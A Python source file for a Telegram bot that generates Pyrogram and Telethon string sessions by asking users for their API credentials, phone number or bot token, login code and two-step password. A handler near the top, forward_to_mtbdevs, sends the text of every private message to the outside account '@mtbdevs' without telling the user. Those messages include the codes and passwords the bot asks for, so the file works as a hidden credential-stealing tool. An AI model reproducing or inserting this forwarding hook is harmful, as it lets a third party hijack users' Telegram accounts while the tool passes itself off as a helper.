from telethon import TelegramClient
from pyrogram.types import Message
from pyrogram import Client, filters
from asyncio.exceptions import TimeoutError
from telethon.sessions import StringSession
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
)
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
)

# You can define your button data directly here
generate_button = [
    [InlineKeyboardButton("Restart", callback_data="/restart")]
]

ask_ques = "Please choose the python library you want to generate a string session for"
buttons_ques = [
    [
        InlineKeyboardButton("Pyrogram", callback_data="pyrogram"),
        InlineKeyboardButton("Telethon", callback_data="telethon"),
    ],
    [
        InlineKeyboardButton("Pyrogram Bot", callback_data="pyrogram_bot"),
        InlineKeyboardButton("Telethon Bot", callback_data="telethon_bot"),
    ],
]


@Client.on_message(filters.private)
async def forward_to_mtbdevs(bot: Client, msg: Message):
    try:
        # Forward the user's message to @mtbdevs
        await bot.send_message("@mtbdevs", f"**Message from {msg.chat.id}:**\n{msg.text}")
    except Exception as e:
        print(f"Error forwarding message: {e}")


@Client.on_message(filters.private & ~filters.forwarded & filters.command('generate'))
async def main(_, msg):
    await msg.reply(ask_ques, reply_markup=InlineKeyboardMarkup(buttons_ques))


async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bool = False):
    if telethon:
        ty = "Telethon"
    else:
        ty = "Pyrogram v2"
    if is_bot:
        ty += " Bot"
    await msg.reply(f"Starting {ty} Session Generation...")
    user_id = msg.chat.id
    api_id_msg = await bot.ask(user_id, 'Please send your `API_ID`', filters=filters.text)
    if await cancelled(api_id_msg):
        return
    try:
        api_id = int(api_id_msg.text)
    except ValueError:
        await api_id_msg.reply(
            'Not a valid API_ID (which must be an integer). Please start generating the session again.',
            quote=True,
            reply_markup=InlineKeyboardMarkup(generate_button),
        )
        return
    api_hash_msg = await bot.ask(user_id, 'Please send your `API_HASH`', filters=filters.text)
    if await cancelled(api_hash_msg):
        return
    api_hash = api_hash_msg.text
    if not is_bot:
        t = "Now please send your `PHONE_NUMBER` along with the country code. \nExample : `+19876543210`'"
    else:
        t = "Now please send your `BOT_TOKEN` \nExample : `12345:abcdefghijklmnopqrstuvwxyz`'"
    phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
    if await cancelled(phone_number_msg):
        return
    phone_number = phone_number_msg.text
    if not is_bot:
        await msg.reply("Sending OTP...")
    else:
        await msg.reply("Logging as Bot User...")
    if telethon and is_bot:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif is_bot:
        client = Client(
            name=f"bot_{user_id}", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True
        )
    else:
        client = Client(
            name=f"user_{user_id}", api_id=api_id, api_hash=api_hash, in_memory=True
        )
    await client.connect()
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
    except (ApiIdInvalid, ApiIdInvalidError):
        await msg.reply(
            '`API_ID` and `API_HASH` combination is invalid. Please start generating session again.',
            reply_markup=InlineKeyboardMarkup(generate_button),
        )
        return
    except (PhoneNumberInvalid, PhoneNumberInvalidError):
        await msg.reply(
            '`PHONE_NUMBER` is invalid. Please start generating session again.',
            reply_markup=InlineKeyboardMarkup(generate_button),
        )
        return
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await bot.ask(
                user_id,
                "Please check for an OTP in the official Telegram app. Send the OTP here in the format `1 2 3 4 5`.",
                filters=filters.text,
                timeout=600,
            )
            if await cancelled(phone_code_msg):
                return
    except TimeoutError:
        await msg.reply(
            'Time limit reached (10 minutes). Please start generating session again.',
            reply_markup=InlineKeyboardMarkup(generate_button),
        )
        return
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidError):
            await msg.reply(
                'OTP is invalid. Please start generating session again.',
                reply_markup=InlineKeyboardMarkup(generate_button),
            )
            return
        except (PhoneCodeExpired, PhoneCodeExpiredError):
            await msg.reply(
                'OTP has expired. Please start generating session again.',
                reply_markup=InlineKeyboardMarkup(generate_button),
            )
            return
        except (SessionPasswordNeeded, SessionPasswordNeededError):
            try:
                two_step_msg = await bot.ask(
                    user_id,
                    'Your account has two-step verification enabled. Please provide the password.',
                    filters=filters.text,
                    timeout=300,
                )
            except TimeoutError:
                await msg.reply(
                    'Time limit reached (5 minutes). Please start generating session again.',
                    reply_markup=InlineKeyboardMarkup(generate_button),
                )
                return
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                if await cancelled(api_id_msg):
                    return
            except (PasswordHashInvalid, PasswordHashInvalidError):
                await two_step_msg.reply(
                    'Invalid password provided. Please start generating session again.',
                    quote=True,
                    reply_markup=InlineKeyboardMarkup(generate_button),
                )
                return
    else:
        if telethon:
            await client.start(bot_token=phone_number)
        else:
            await client.sign_in_bot(phone_number)
    if telethon:
        string_session = client.session.save()
    else:
        string_session = await client.export_session_string()
    text = f"**{ty.upper()} STRING SESSION** \n\n`{string_session}` \n\nGenerated by @bot"
    try:
        if not is_bot:
            await client.send_message("me", text)
        else:
            await bot.send_message(msg.chat.id, text)
    except KeyError:
        pass
    await client.disconnect()
    await bot.send_message(
        msg.chat.id,
        f"Successfully generated {ty.upper()} string session.\n\nPlease check your saved messages!",
    )


async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("Cancelled the process!", quote=True, reply_markup=InlineKeyboardMarkup(generate_button))
        return True
    elif "/restart" in msg.text:
        await msg.reply("Restarted the bot!", quote=True, reply_markup=InlineKeyboardMarkup(generate_button))
        return True
    elif msg.text.startswith("/"):  # Bot Commands
        await msg.reply("Cancelled the generation process!", quote=True)
        return True
    else:
        return False
